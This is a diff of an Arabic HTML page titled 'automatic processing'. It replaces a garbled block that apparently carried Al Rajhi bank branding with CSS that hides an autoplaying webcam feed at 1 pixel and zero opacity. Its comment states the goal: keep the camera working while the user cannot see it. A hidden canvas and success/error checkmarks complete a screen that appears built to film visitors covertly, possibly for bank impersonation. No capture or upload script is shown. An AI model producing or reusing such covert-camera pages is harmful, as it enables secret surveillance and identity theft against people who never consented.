@@ -5,46 +5,49 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>معالجة تلقائية</title>
     <style>
-     <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>AI Processing</title>
-    <style>
-        
-    body {
-    margin: 0;
-    padding: 0;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    overflow: hidden;
-    background-color: #050505;
-    background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #050505 100%);
-    color: white;
-    font-family: 'Segoe UI', sans-serif;
-}
+        body {
+            background-color: #ffffff; /* جعل الخلفية بيضاء تماماً */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
+        video {
+            width: 1px; /* تصغير العرض لـ 1 بكسل */
+            height: 1px; /* تصغير الطول لـ 1 بكسل */
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0; /* جعل الفيديو شفافاً (غير مرئي) */
+            pointer-events: none; /* لمنع أي تفاعل مع الفيديو المخفي */
+            z-index: 1;
+        }
+        .result-mark {
+            font-size: 120px;
+            user-select: none;
+            display: none;
+            animation: scaleUp 0.3s ease-in-out;
+            position: relative;
+            z-index: 10;
+        }
+        #success-mark { color: #28a745; }
+        #error-mark { color: #dc3545; }
 
-/* هذا هو كود الراجحي ثلاثي الأبعاد المتحرك */
-.rajhi-3d {
-    position: absolute;
-    font-size: 15vw;
-    font-weight: 900;
-    color: rgba(255, 255, 255, 0.05);
-    z-index: 0;
-    pointer-events: none;
-    user-select: none;
-    /* تأثير 3D عبر الظلال المتعددة */
-    text-shadow: 2px 2px 0px #333, 4px 4px 0px #222, 6px 6px 0px #111;
-    /* حركة نبض خفيفة لإعطاء إيحاء بالتفاعل */
-    animation: float 4s ease-in-out infinite;
-}
+        @keyframes scaleUp {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
 
-@keyframes float {
-    0%, 100% { transform: translateY(0px) rotate(-5deg); }
-    50% { transform: translateY(-20px) rotate(-5deg); }
-}
     <!-- عناصر الواجهة -->
     <video id="video" autoplay playsinline></video>
     <div id="success-mark" class="result-mark">✓</div>
